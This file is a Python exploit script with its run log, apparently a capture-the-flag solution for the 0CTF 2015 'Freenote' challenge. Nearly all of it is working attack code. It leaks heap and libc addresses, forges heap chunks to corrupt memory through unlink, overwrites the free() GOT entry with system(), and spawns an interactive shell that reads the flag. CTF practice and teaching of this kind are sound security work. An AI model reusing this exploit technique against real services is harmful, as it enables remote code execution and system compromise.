#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# 0CTF 2015 - Freenote (Pwn 300pt)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)

  return ret

# --------------------------------------------------------------------------------------------------
def new_note(len, text):                    # create a new note
    s.send('2' + '\n')
    recv_until('Length of new note:')
    s.send( str(len) + '\n')
    recv_until('Enter your note:')
    s.send( text + '\n')
    recv_until('Your choice:')

# --------------------------------------------------------------------------------------------------
def edit_note(index, len, text):            # edit a note
    s.send('3' + '\n')
    recv_until('Note number:')
    s.send( str(index) + '\n')
    recv_until('Length of note:')
    s.send( str(len) + '\n')
    recv_until('Enter your note:')
    s.send( text + '\n')
    recv_until('Your choice:')

# --------------------------------------------------------------------------------------------------
def del_note(index):                        # delete a ntoe
    s.send('4' + '\n')
    recv_until('Note number:')
    s.send( str(index) + '\n')
    recv_until('Your choice:')


# --------------------------------------------------------------------------------------------------
def extract( raw ):                     # extract a qword from socket stream
    
    qword = ''                              #
    for i in range(8):
        digit = raw[i]                      # read a digit

        if digit == '\n':                   # if newline
            qword += '\x00' * (8-i)         #   pad with zeros
            break                           #   and stop

        qword += digit                      # append digit

    return struct.unpack("<Q", qword)[0]    # return qword

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    #s = socket.create_connection(('202.112.26.108', 10001)) 
    s = socket.create_connection(('localhost', 7777))   # connect to server
    f = s.makefile()                                    # associate a file object with socket

    recv_until('Your choice:')

    # -------------------------------------------------------------------------
    # first we leak an address from the heap
    # -------------------------------------------------------------------------
    print '[+] Leaking a heap address...'

    new_note(128, 'A'*127)                      # create 4 notes A, B, C and D
    new_note(128, 'B'*127)
    new_note(128, 'C'*127)
    new_note(128, 'D'*127)
    
    del_note(0)                                 # delete notes A and C
    del_note(2)

    # At this point freelist will contain A and C and A->bk = &C_header
    # We cannot print note A because it's not used.
    # Instead we allocate a new note where A was.
    # We make note 8 bytes long to overwrite only A->fd
    new_note(8, 'K'*7)                          # note at &A; overwrite A->fd
    
    s.send('1\n')                               # print notes. After K's, &C_header is printed
    r = recv_until('Your choice:')              # heap's address is somewhere here

    # calculate heap's base
    heap_base = extract(r[len('0. KKKKKKKK'):]) -128-16 -128-16 -0x1810-16

    print '[+] Heap starts at', hex(heap_base)

    del_note(0)                                 # clear all notes
    del_note(1)
    del_note(3)


    # -------------------------------------------------------------------------
    # do an arbitrary write using unlink() with a fake chunk
    # -------------------------------------------------------------------------
    print '[+] Writing a bogus pointer on note table...'

    new_note(128, 'A'*127)                      # create 4 notes A, B, C and D
    new_note(128, 'B'*127)
    new_note(128, 'C'*127)

    fake_chdr = struct.pack('<QQQQ',            # create a fake chunk header
        heap_base+0x60,                         # fd = note[3].ptr - 0x18
        heap_base+0x68,                         # bk = note[3].ptr - 0x10
        0,0)                                    # fd_nextsize and bk_nextsize set to 0

    new_note(128, 'D'*16 + fake_chdr + 'D'*79)  # note D

    del_note(1)                                 # delete notes B and C
    del_note(2)

    # The pointer that we'll overwrite on note table must be used,
    # so the fake chunk must be setted up on a note that is used.

    fake_chdr = struct.pack('<QQ',              # create another fake chunk header inside note D
        0xffffffffffffff60,                     # set a negative prev_size to move down to D
        0x90)                                   # set a valid size to the next chunk's header

    new_note(256, 'E'*128 + fake_chdr +'E'*111) # note E cover notes B and C

    '''
        free(), will free our fake chunk with size=0x90. Because LSBit is clear,
        this chunk will be coalesced with the previous chunk. prev_size=-0xa0, so
        the previous chunk will be at the beginning of note D.

        Note D will be unlinked from freelist, so note[3].ptr will be &note[3].ptr-16
        which is within note table.

        After coalescing with prev chunk, next chunk is checked. But size=0x90 which
        points to note D. Note D is used, so chunk won't be coalesced.
    '''
    del_note(2)                                 # trigger free with the fake chunk within E

    # -------------------------------------------------------------------------
    # At this point, note[3].ptr = &note[3].ptr - 16. 
    # Set note[3] (keep the same size; realloc() will mess things) to add
    # entries in note table, with arbitrary pointers
    # 
    # set a pointer to .got.free (0x602018) and one to "/bin/sh"
    # ------------------------------------------------------------------------- 
    print '[+] Write arbitrary pointers in note table...'

    fake_note  = 'i'*8                          # some padding first
    fake_note += struct.pack('<QQQ', 1, 8, 0x602018)
    fake_note += struct.pack('<QQQ', 1, 8, heap_base+0x98)
        
    edit_note(3, 128, fake_note+'/bin/sh\x00'+'F'*63 )

    # -------------------------------------------------------------------------
    # note[3].ptr points to .got.free
    # ------------------------------------------------------------------------- 
    print '[+] Leaking address of free()...'


    s.send('1\n')                               # print notes. After K's, &C_header is printed
    r = recv_until('Your choice:')              # address of free() is somewhere here

    free_addr = extract(r[r.find('3. ')+3:])

    print '[+] free() at', hex(free_addr)

    free_base   = 0x000000000007c650
    system_base = 0x00000000000414f0
    #free_base   = 0x00076c60
    #system_base = 0x00040190

    system_addr = free_addr - free_base + system_base

    print '[+] Calculating system() address: ', hex(system_addr)

    # -------------------------------------------------------------------------
    # Overwrite .got.free with system()
    # ------------------------------------------------------------------------- 
    print '[+] Overwriting .got.free with system...', hex(system_addr)

    edit_note(3, 8, str(struct.pack('<Q', system_addr)))    # .got.free = system()

    # -------------------------------------------------------------------------
    # Overwrite .got.free with system()
    # ------------------------------------------------------------------------- 
    print '[+] Triggering exploit...', hex(system_addr)

    s.send('4\n' + '4\n')                       # trigger exploit
#   del_note(4)                                 # trigger exploit

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                      # try to open shell
    t.sock = s
    t.interact()
    
    exit(0) 
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/0ctf_15# ./freenote_expl.py 
    [+] Leaking a heap address...
    [+] Heap starts at 0x14f7000
    [+] Writing a bogus pointer on note table...
    [+] Write arbitrary pointers in note table...
    [+] Leaking address of free()...
    [+] free() at 0x7f5a5d82f650
    [+] Calculating system() address:  0x7f5a5d7f44f0
    [+] Overwriting .got.free with system... 0x7f5a5d7f44f0
    [+] Triggering exploit... 0x7f5a5d7f44f0
    [+] Opening Shell...
    Note number: whoami
        freenote
    cat /home/freenote/flag
        0ctf{freenote_use_free_to_get_flag}
    exit
    Done.
    == 0ops Free Note ==
    1. List Note
    2. New Note
    3. Edit Note
    4. Delete Note
    5. Exit
    ====================
    Your choice: ^C
'''
# --------------------------------------------------------------------------------------------------
